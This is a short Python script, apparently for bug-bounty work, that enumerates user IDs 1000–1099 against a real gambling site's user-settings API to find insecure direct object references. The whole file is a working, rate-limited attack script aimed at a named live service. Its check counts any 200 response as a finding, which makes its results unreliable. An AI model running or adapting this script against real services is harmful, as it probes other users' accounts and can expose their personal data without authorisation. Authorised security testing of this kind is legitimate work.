import requests
import time

# Target and Config
target = "https://1win.com/api/v1/user/settings/"
headers = {
    "User-Agent": "HackerOne-Researcher-Muaaz", # Be transparent
    "Authorization": "Bearer YOUR_TEST_TOKEN"
}

# 5 requests per second = 0.2s delay
DELAY = 0.2 

def scan_idor(user_id):
    url = f"{target}{user_id}"
    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        print(f"[!] Potential IDOR found on User ID: {user_id}")
    time.sleep(DELAY)

# Test a range of IDs
for i in range(1000, 1100):
    scan_idor(i)